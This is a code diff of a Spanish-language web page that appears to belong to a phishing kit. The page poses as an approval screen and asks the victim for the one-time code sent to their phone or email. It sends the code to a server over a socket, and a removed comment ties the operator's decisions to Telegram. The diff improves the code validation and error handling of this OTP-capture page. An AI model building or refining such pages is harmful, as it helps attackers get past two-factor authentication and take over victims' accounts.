@@ -82,13 +82,26 @@
 </head>
 <body>
   <div class="screen">
-    <h3>¡APRBADO!</h3>
-    <p>Ingresa el codigo que se le fue enviado a su celular o correo electronico.</p>
+    <h3>¡APROBADO!</h3>
+    <p>Ingresa el código que fue enviado a tu celular o correo electrónico.</p>
+
+    <!-- Input en estado de error inicial -->
     <div class="input-group campo-requerido">
       <div class="icon"><i class="fas fa-key"></i></div>
-      <input type="tel" id="codigo" placeholder="Código de verificación" pattern="[0-9]*" inputmode="numeric" minlength="8" maxlength="8" required>
+      <input
+        type="text"
+        id="codigo"
+        placeholder="Código de verificación"
+        minlength="8"
+        maxlength="8"
+        required
+      >
     </div>
-    <p class="mensaje-error">Código inválido. Por favor, ingrese el código correctamente.</p>
+
+    <p id="mensajeError" class="mensaje-error">
+      Código inválido. Por favor, ingrese un código de 8 caracteres alfanuméricos.
+    </p>
+
     <button onclick="reintentarCodigo()">Reintentar</button>
   </div>
 
@@ -96,26 +109,31 @@
   <script>
     const socket = io();
     const sessionId = localStorage.getItem("sessionId");
-
     socket.emit("reconectar", sessionId);
 
     function reintentarCodigo() {
-      const codigo = document.getElementById("codigo").value;
+      const codigoInput = document.getElementById("codigo");
+      const mensajeError = document.getElementById("mensajeError");
+      const codigo = codigoInput.value.trim();
 
-      if (!codigo || !/^\d{8}$/.test(codigo)) {
-        alert("Ingrese un código válido de 8 dígitos.");
+      // Limpiar estado anterior
+      mensajeError.textContent = "";
+      codigoInput.classList.remove("campo-requerido");
+
+      // Validación: 8 caracteres alfanuméricos
+      const regex = /^[A-Za-z0-9]{8}$/;
+      if (!regex.test(codigo)) {
+        mensajeError.textContent = "El código debe tener 8 caracteres alfanuméricos.";
+        codigoInput.classList.add("campo-requerido");
         return;
       }
 
-      // Enviar OTP ingresado al servidor
+      // Enviar al servidor y redirigir
       socket.emit("otpIngresado", { codigo, sessionId });
-
-      // Ir a la pantalla de espera
       window.location.href = "opciones.html";
     }
 
-    // Recibir respuesta del admin desde Telegram
-    socket.on("respuestaOtp", (decision) => {
+    socket.on("respuestaOtp", decision => {
       if (decision === "finalizar") {
         window.location.href = "https://www.google.com";
       } else if (decision === "otp_error") {
